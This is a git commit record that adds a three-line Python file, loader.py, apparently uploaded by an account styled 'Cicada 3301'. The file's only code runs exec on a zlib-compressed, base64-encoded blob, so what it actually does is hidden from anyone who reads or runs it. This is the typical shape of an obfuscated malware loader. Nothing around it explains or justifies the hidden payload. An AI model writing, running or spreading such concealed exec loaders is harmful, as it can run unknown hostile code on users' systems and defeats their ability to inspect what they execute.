f2441243a8dd5ba80821f029eab46fc535e456b0
Cicada 3301 <50529176+Cicadadenis@users.noreply.github.com>
2021-06-27 04:01:37 +0300

    Add files via upload

---
+++ loader.py
@@ -0,0 +1,3 @@
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eJxVjsEOgjAQRO/9Co6QNP2DXogmJoqY2DtZoMXGlG22e+HvrSBRjzOz+2YcYSjA40QQCh8iEhc1sjz4FIGHhyXJS7RJuJ9DNeDM5HvlUugSI8FkVbABadkZzaruW7Y9j8Cwxxng/CR6ZJ3bSsannfVmqro1nWnPx6uMQMl2AUer1xHq9jaarNXJNJdKjFF/h5aZJj9r9F9/WVXiBfxvVf0=')))
+# Created by cicadacrypto Cicada3301(https://github.com/Cicada)
